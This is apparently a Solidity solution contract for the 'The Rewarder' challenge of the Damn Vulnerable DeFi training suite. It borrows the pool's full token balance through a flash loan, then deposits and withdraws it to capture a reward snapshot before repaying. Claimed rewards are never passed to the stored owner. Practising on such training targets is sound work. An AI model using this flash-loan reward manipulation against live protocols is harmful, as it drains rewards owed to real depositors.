// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import '../the-rewarder/TheRewarderPool.sol';
import '../the-rewarder/FlashLoanerPool.sol';
import '../DamnValuableToken.sol';

contract TheRewarderAttack {
    TheRewarderPool public pool;
    FlashLoanerPool public flashLoanerPool;
    address public owner;

    constructor(address poolAddress, address flashLoanerPoolAddress) {
        pool = TheRewarderPool(poolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        owner = msg.sender;
    }

    function takeLoan() public {
        flashLoanerPool.flashLoan(IERC20(pool.liquidityToken()).balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20(pool.liquidityToken()).approve(address(pool), type(uint256).max);
        pool.deposit(amount);
        pool.withdraw(amount);
        IERC20(pool.liquidityToken()).transfer(address(flashLoanerPool), amount);
    }
}
